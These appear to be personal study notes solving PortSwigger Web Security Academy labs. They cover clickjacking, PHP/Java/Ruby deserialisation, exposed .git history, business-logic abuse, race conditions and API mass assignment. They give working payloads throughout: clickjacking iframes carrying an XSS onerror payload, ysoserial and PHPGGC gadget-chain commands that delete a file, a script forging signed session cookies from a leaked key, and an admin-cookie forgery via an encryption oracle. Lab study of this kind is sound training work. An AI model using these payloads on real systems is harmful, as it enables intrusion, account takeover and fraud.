## Clickjacking Vulnerabilities:
Could possibly try combine with XSS to steal cookie?
```
<style>
        iframe {
                position:relative;
                width:500;
                height: 700;
                opacity: 0.1;
                z-index: 2;
        }
        div {
                position:absolute;
                top:610;
                left:80;
                z-index: 1;
        }
</style>
<div>Click me</div>
<iframe
src="https://lab_id.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@website.com&subject=test&message=test#feedbackResult"></iframe>

---
<style>
        iframe {
                position:relative;
                width:500;
                height: 700;
                opacity: 0.1;
                z-index: 2;
        }
   .firstClick, .secondClick {
                position:absolute;
                top:492;
                left:54;
                z-index: 1;
        }
   .secondClick {
                top:292;
                left:225;
        }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://lab_id.web-security-academy.net/my-account"></iframe>

```
---
## Insecure Deserialisation Vulnerabilities
- ==Using application functionality to exploit insecure deserialization==
  Delete account function has an avatar_link attribute which is a file path. 
  Modify the file path to be /home/carlos/morale.txt
  O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"gc03tv3pzs5h5kabc2eeowm9lnng69iy";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
- ==Arbitrary object injection in PHP==
  Use Burp Sitemap to find there is a /lib/CustomTemplate.php, which can be viewed by adding a Tilde, e.g.:
  https://lab_id.web-security-academy.net/lib/CustomTemplate.php~
  Create this class by sending it as a seriliased object with the file path as /home/carlos/morale.txt:
  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
  Send this for the magic method to be automatically invoked and delete Carlos's file.
- ==Exploiting Java deserialization with Apache Commons==
  Download ysoserial-all.jar 
  
  java   --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
   
  Encode in URL and modify cookie in repeater and send
  Or use Deserialization Scanner extension
- ==Exploiting PHP deserialization with a pre-built gadget chain==
  The session cookie will show that it is a PHP serial object with a sha1_mac signature. Changing the serial object doesn't work because it needs to be signed using a secret key. In target sitemap there is a cgi-bin/phpinfo.php endpoint. Search for secret and obtain the secret key.
  
  git clone https://github.com/ambionics/phpggc.git
  cd phpggc
  
  Use PHPGGC tool, e.g.:  ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 and copy the output
  
  Create a PHP script: \<?php
  $object = "OBJECT-GENERATED-BY-PHPGGC";
  $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
  
  php phpfile.php
  
  
  Run the script and copy and paste this into the session cookie value to complete the lab.
- ==Exploiting Ruby deserialization using a documented gadget chain==
  Use the last [payload](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) in online [Ruby complier](https://playground.masteringbackend.com/ruby) to obtain the object then run echo command to remove newline characters and then URL-encode the whole thing and enter in as the cookie to solve the lab. Change the command that should be executed from id to rm /home/carlos/morale.txt
  Replace the final two lines with puts Base64.encode64(payload)
  
  echo "object" | tr -d "\n\r"
  
  Go into Ubuntu and run ruby hello.rb | tr -d "\n\r"



## Information Disclosure Vulnerabilities
- ==Information disclosure in version control history==
  Visiting https://lab_id.web-security-academy.net/.git gives access to git files. Use wget -r https://lab_id.web-security-academy.net/.git on lab system to  get the git files. 
  cd lab_id.web-security-academy.net/.git
  git log
  git show commit_id
  
  Use administrator and revealed password to log in as administrator
## Business Logic Vulnerabilities
- ==Low-level logic flaw==
  Send POST /cart request with productId=1&quantity=99&redir=CART to Intruder. Use Null payloads and Maximum concurrent requests = 1 and refresh the page until the total value becomes negative. Sending 324 requests should bring the total to a manageable amount, from which another item can be added with an adjusted quantity to bring the total to a manageable amount
- ==Insufficient workflow validation==
  Order something to view the entire workflow.
  Add the item to cart and send GET /cart/order-confirmation?order-confirmed=true  request to the repeater. 
  Send the request to solve the lab - the POST /cart endpoint, which validates fund sufficiency, is skipped
- ==Authentication bypass via flawed state machine==
  Log in with Interceptor on and drop the GET role-selector request and refresh the home page, which reveals an Admin panel for deletion of user carlos
- ==Infinite money logic flaw==
  This lab has a voucher which takes off 30% off of the purchase. Go through the process of adding the $10 gift card, applying the SIGNUP30 voucher, placing the order.
  Go to Settings -> Sessions and add a rule - change scrope to Incloude all URLs and add a Rule action: Run a macro. In this macro: add POST /cart, POST /cart/coupon, POST /cart/checkout, GET cart/order-confirmation?order-confirmed=true and POST /gift-card to the macro, in that order. Click on the GET /cart/order-confirmation?order-confirmed=true and Configure Item. Add Custom parameter locations in rseponse and highlight the gift card code at the bottom.Click on the POST /gift-card request and Configure Item - Derive from prior reponse and make sure it's set to Response 4. Send the GET /my-account?username= request to the Intruder and set with Indefitnite Null payloads and Maximum concurrent requests set to 1. Keep going until there is enough money to buy the item, the SIGNUP30 can be applied here also.
- ==Authentication bypass via encryption oracle==
  The blog post email field can act as an encryption oracle. When entering an invalid email, it shows the invalid email on the page, and a "notification" cookie is generated. Taking the stay-logged in cookie into this notification cookie field and sending the request decrypts the ciphertext and reveals plaintext  username:timestamp. administrator:timestamp encrypted doesn't work, as it needs to be a multiple of 4 apparently, so pad it with random string like xxxxxxxxxadministrator:timestamp, encrypt it, then URL and Base64 decode and delete the first 32 bytes. Re-encode and use it as the Stay-logged in cookie to gain admin privileges

# Race Condition Vulnerabilities
- ==Multi-endpoint race conditions==
  Find candidate endpoints, e.g. POST /cart and POST /cart/checkout 
  Testing GET /cart with and without the session cookie shows that this endpoint may be vulnerable to race condition attacks because the state of the cart is stored server-side in your session and any operations on the cart are keyed on your session ID or the associated user ID.  Submitting and receiving confirmation of a successful order takes place over a single request/response cycle. There is a race window between when your order is validated and when it is confirmed. This could enable you to add more items to the order after the server checks whether you have enough store credit.
  
  Group together POST /cart and POST /cart/checkout, with POST /cart having the product=1 parameter. Add a Gift card to the cart and carry out the attack by sending requests in parallel.

## API Testing Vulnerabilities
- ==Finding and exploiting an unused API endpoint==
  Use PATCH /api/products/1/price  endpoint
  with parameters: {"price":0,"message":"People have viewed this item in the last 1800 minutes"}
  Purchase the jacket
- ==Exploiting a mass assignment vulnerability==
  Check the GET /api/checkout endpoint, it shows there is a hidden parameter called chosen_discount
  Send in Repeater a POST /api/checkout request with the following parameter
  {
      "chosen_discount":{
        "percentage":100
            },
                "chosen_products":[
                {
                            "product_id":"1",
                                    "quantity":1
                }
                            ]
      }